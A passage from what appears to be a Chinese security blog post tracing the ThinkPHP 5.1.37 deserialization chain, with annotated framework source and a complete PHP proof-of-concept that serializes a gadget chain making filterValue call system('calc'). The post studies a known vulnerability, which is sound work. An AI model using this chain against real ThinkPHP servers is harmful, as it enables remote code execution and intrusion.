$data[$val] = $data[&#x27;lin&#x27;] = calc</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$default</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_object</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析过滤器</span></span><br><span class="line">    <span class="variable">$filter</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getFilter</span>(<span class="variable">$filter</span>, <span class="variable">$default</span>);<span class="comment">//$filter[0=&gt;&#x27;system&#x27;,1=&gt;$default]  ，这里先跟进该函数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk_recursive</span>(<span class="variable">$data</span>, [<span class="variable">$this</span>, <span class="string">&#x27;filterValue&#x27;</span>], <span class="variable">$filter</span>);</span><br><span class="line">        <span class="comment">//这块还没get到</span></span><br><span class="line">        <span class="comment">////回调函数filterValue ，跟进该函数，$data = filterValue.$value = calc 、 $filter = filterValue.$filters = [0-&gt;system,1-&gt;$default] 、 $name = filterValue.$key = &#x27;lin&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">version_compare</span>(PHP_VERSION, <span class="string">&#x27;7.1.0&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">// 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">arrayReset</span>(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">filterValue</span>(<span class="variable">$data</span>, <span class="variable">$name</span>, <span class="variable">$filter</span>); <span class="comment">//$data , $filter</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$type</span>) &amp;&amp; <span class="variable">$data</span> !== <span class="variable">$default</span>) &#123;</span><br><span class="line">        <span class="comment">// 强制类型转换</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">typeCast</span>(<span class="variable">$data</span>, <span class="variable">$type</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>$data &#x3D; $this-&gt;getData($data, $name);</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span>, <span class="variable">$name</span></span>)  //$<span class="title">data</span>[&#x27;<span class="title">lin</span>&#x27;=&gt;</span><span class="string">&#x27;calc&#x27;</span>],<span class="variable">$name</span> = <span class="string">&#x27;lin&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>) <span class="keyword">as</span> <span class="variable">$val</span>) &#123;<span class="comment">//分割成数组[&#x27;lin&#x27;]</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$data</span>[<span class="variable">$val</span>])) &#123;</span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$data</span>[<span class="variable">$val</span>];<span class="comment">// 此时$data = $data[&#x27;lin&#x27;] = &#x27;calc&#x27; ,回到上面input()</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里<code>$data</code> &#x3D; <code>$data[$val]</code> &#x3D; <code>$data[$name]</code></p>
<p>$filter &#x3D; $this-&gt;getFilter($filter, $default);</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getFilter</span>(<span class="params"><span class="variable">$filter</span>, <span class="variable">$default</span></span>)//$<span class="title">filter</span>在<span class="title">poc</span>里定义为<span class="title">system</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$filter</span>)) &#123;</span><br><span class="line">        <span class="variable">$filter</span> = [];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$filter</span> = <span class="variable">$filter</span> ?: <span class="variable language_">$this</span>-&gt;filter; <span class="comment">//$filter = $this-&gt;filter = system</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$filter</span>) &amp;&amp; <span class="literal">false</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$filter</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$filter</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$filter</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$filter</span> = (<span class="keyword">array</span>) <span class="variable">$filter</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$filter</span>[] = <span class="variable">$default</span>;<span class="comment">//此时$filter[]为&#123; [0]=&gt;&quot;system&quot; [1]=&gt;$default &#125;，回到上面Input()</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$filter</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入到filterValue函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 递归过滤给定的值</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  mixed     $value 键值</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  mixed     $key 键名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  array     $filters 过滤方法+默认值</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span>(<span class="params">&amp;<span class="variable">$value</span>, <span class="variable">$key</span>, <span class="variable">$filters</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$default</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$filters</span>);<span class="comment">//删除数组最后一个元素，此时$filters=$filter[0]=system</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$filters</span> <span class="keyword">as</span> <span class="variable">$filter</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_callable</span>(<span class="variable">$filter</span>)) &#123;<span class="comment">//验证变量名能否作为函数调用，system()</span></span><br><span class="line">            <span class="comment">// 调用函数或者方法过滤</span></span><br><span class="line">            <span class="variable">$value</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$filter</span>, <span class="variable">$value</span>); <span class="comment">//执行回调函数system(&#x27;calc&#x27;);</span></span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_scalar</span>(<span class="variable">$value</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="literal">false</span> !== <span class="title function_ invoke__">strpos</span>(<span class="variable">$filter</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">                <span class="comment">// 正则过滤</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="variable">$filter</span>, <span class="variable">$value</span>)) &#123;</span><br><span class="line">                    <span class="comment">// 匹配不成功返回默认值</span></span><br><span class="line">                    <span class="variable">$value</span> = <span class="variable">$default</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (!<span class="keyword">empty</span>(<span class="variable">$filter</span>)) &#123;</span><br><span class="line">                <span class="comment">// filter函数不存在时, 则使用filter_var进行过滤</span></span><br><span class="line">                <span class="comment">// filter为非整形值时, 调用filter_id取得过滤id</span></span><br><span class="line">                <span class="variable">$value</span> = <span class="title function_ invoke__">filter_var</span>(<span class="variable">$value</span>, <span class="title function_ invoke__">is_int</span>(<span class="variable">$filter</span>) ? <span class="variable">$filter</span> : <span class="title function_ invoke__">filter_id</span>(<span class="variable">$filter</span>));</span><br><span class="line">                <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$value</span>) &#123;</span><br><span class="line">                    <span class="variable">$value</span> = <span class="variable">$default</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="利用链路"><a href="#利用链路" class="headerlink" title="利用链路"></a>利用链路</h2><p><img src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/image-8.png"></p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&quot;lin&quot;</span>=&gt;[<span class="string">&quot;calc.exe&quot;</span>,<span class="string">&quot;calc&quot;</span>]];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&quot;lin&quot;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">        <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,</span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = [<span class="string">&quot;var_ajax&quot;</span>=&gt;<span class="string">&#x27;lin&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="variable language_">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=[<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结语：</p>
<p>基于现有学识，本文可能存在诸多错误，网上关于thinkphp5反序列化利用连文章很多，推荐更多看看大佬们的文章。小tips：许多文章真的难评，写的缺乏逻辑性，反而很绕……</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h2><p><a target="_blank" rel="noopener" href="https://www.oryoy.com/news/ru-he-zai-ubuntu-huan-jing-xia-gao-xiao-bu-shu-thinkphp5-kuang-jia-jin-xing-web-kai-fa.html">如何在Ubuntu环境下高效部署ThinkPHP5框架进行Web开发</a></p>
<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6854573211267366926">https://juejin.cn/post/6854573211267366926</a></p>
<p><a target="_blank" rel="noopener" href="https://saofeia.github.io/2024/10/10/Thinkphp5.1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96ajax%E9%93%BE/">https://saofeia.github.io/2024/10/10/Thinkphp5.1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96ajax%E9%93%BE/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/starme/p/18467006">https://www.cnblogs.com/starme/p/18467006</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/6223#toc-2">https://xz.aliyun.com/news/6223#toc-2</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/263977.html">https://www.freebuf.com/vuls/263977.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/th0r/p/14653223.html">https://www.cnblogs.com/th0r/p/14653223.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/th0r/p/14653223.html">https://www.cnblogs.com/th0r/p/14653223.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/317886.html">https://www.freebuf.com/vuls/317886.html</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://sebastian-alphax.github.io">Abernethy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://sebastian-alphax.github.io/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94ThinkPHP5.1.37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E8%B7%AF%E6%9E%84%E9%80%A0/">https://sebastian-alphax.github.io/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94ThinkPHP5.1.37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E8%B7%AF%E6%9E%84%E9%80%A0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">PHP反序列化</a><a class="post-meta__tags" href="/tags/ThinkPHP/">ThinkPHP</a></div><div class="post-share"><div class="social-share" data-image="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94PHAR%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="PHP反序列化——PHAR反序列化"><img class="cover" src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">PHP反序列化——PHAR反序列化</div></div><div class="info-2"><div class="info-item-1">PHP反序列化——PHAR反序列化转载于 https://forum.butian.net/share/2678#(精研) https://forum.butian.net/index.php/share/3007 https://www.freebuf.com/articles/web/291992.html Phar介绍phar，全称为PHP Archive，phar扩展提供了一种将整个PHP应用程序放入.phar文件中的方法，以方便移动、 安装。.phar文件的最大特点是将几个文件组合成一个文件的便捷方式，.phar文件提供了一种将完整的PHP程 序分布在一个文件中并从该文件中运行的方法。 phar文件结构1、stub 一个供phar扩展用于识别的标志，格式为xxx&lt;?php xxx; __HALT_COMPILER();?&gt;，前面内容不限，但必须以 __HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。 2、manifest phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这...</div></div></div></a><a class="pagination-related" href="/2025/09/12/TFCCTF/" title="TFCCTF"><img class="cover" src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1757651713578.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">TFCCTF</div></div><div class="info-2"><div class="info-item-1">KISSFIXESS &amp; KISSFIXESS_REVENGEKISSFIXESS12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697989910010110210310410510610710810911011111211311411511611711811912012112212312412512612712812913013113213313413513613713813914014114214314414514614714814915015115215315415515615715815916016116216316416516616716816917017117217317417517617717817918018118218318418518618...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94PHAR%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="PHP反序列化——PHAR反序列化"><img class="cover" src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-22</div><div class="info-item-2">PHP反序列化——PHAR反序列化</div></div><div class="info-2"><div class="info-item-1">PHP反序列化——PHAR反序列化转载于 https://forum.butian.net/share/2678#(精研) https://forum.butian.net/index.php/share/3007 https://www.freebuf.com/articles/web/291992.html Phar介绍phar，全称为PHP Archive，phar扩展提供了一种将整个PHP应用程序放入.phar文件中的方法，以方便移动、 安装。.phar文件的最大特点是将几个文件组合成一个文件的便捷方式，.phar文件提供了一种将完整的PHP程 序分布在一个文件中并从该文件中运行的方法。 phar文件结构1、stub 一个供phar扩展用于识别的标志，格式为xxx&lt;?php xxx; __HALT_COMPILER();?&gt;，前面内容不限，但必须以 __HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。 2、manifest phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这...</div></div></div></a><a class="pagination-related" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP/" title="PHP反序列化——反序列化POP"><img class="cover" src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-22</div><div class="info-item-2">PHP反序列化——反序列化POP</div></div><div class="info-2"><div class="info-item-1">PHP反序列化——反序列化POPPOP1学习：1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phphighlight_file(__FILE__);class Hello&#123;    public $source;    public $str;    public function __construct($name)    &#123;        $this-&gt;str=$name;    &#125;    public function __destruct()    &#123;        $this-&gt;source=$this-&gt;str;        echo $this-&gt;source;    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __toString()    &#123;    ...</div></div></div></a><a class="pagination-related" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/" title="PHP反序列化——字符串逃逸"><img class="cover" src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-22</div><div class="info-item-2">PHP反序列化——字符串逃逸</div></div><div class="info-2"><div class="info-item-1">PHP反序列化——字符串逃逸PHP 在反序列化时，底层代码是以 ; 作为字段的分隔，以 &#125; 作为结尾(字符串除外)，并且根据长度判断内容 123流内容:  s:N:&quot;[这里是 N 个字节]&quot; ;  s:4:&quot;next&quot; ; ...指针:    ^^^  ^^^^^^^^^^^^^^^^^  ^^  ^^^^^^^^^^^阶段:    读头  精读 N 字节内容     校验&quot;; 继续解析后续令牌  一旦 filter 改变了这 N 个字节“在流中的位置&#x2F;长度”，就会出现两类错位：  过滤后字符变少（shrink）：实际内容更短 → 为凑满 N，指针会“吞到”后续结构的字节里。  过滤后字符变多（expand）：实际内容更长 → 读满 N 后，理论上的 “; 还没到 → 需要我们在 payload 中预埋一处 “;，恰好落在“读满 N”后的两字节，否则报错。这样可“提前闭合”，把我们想让解析器看到的新键值对暴露在外。   过滤后字符“变少”（shrink）——吞并后续字段 典型过滤：str_replace(‘ph...</div></div></div></a><a class="pagination-related" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/" title="PHP反序列化——魔术方法"><img class="cover" src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-22</div><div class="info-item-2">PHP反序列化——魔术方法</div></div><div class="info-2"><div class="info-item-1">PHP反序列化——魔术方法转载于：PHP反序列化学习 from Y4er&#x20; 序列化在了解反序列化之前我们首先要知道什么是序列化。 在php中，序列化函数是serialize()。 1234567891011121314151617181920212223242526272829303132&lt;?phpclass User&#123;    public $name;    private $sex;    protected $money = 1000;        public function __construct($data, $sex)    &#123;        $this-&gt;data = $data;        $this-&gt;sex = $sex;    &#125;&#125;$number = 66;$str = &#x27;Y4er&#x27;;$bool = true;$null = NULL;$arr = array(&#x27;a&#x27; =&gt; 1, &#x27;b&#x27; =&gt; 2);$user...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Abernethy</div><div class="author-info-description">「Abernethy」的网络安全研习录</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Sebastian-AlphaX"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Sebastian-AlphaX" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:2926295043@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94ThinkPHP5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E8%B7%AF%E6%9E%84%E9%80%A0"><span class="toc-number">1.</span> <span class="toc-text">PHP反序列化——ThinkPHP5.1.37反序列化链路构造</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item 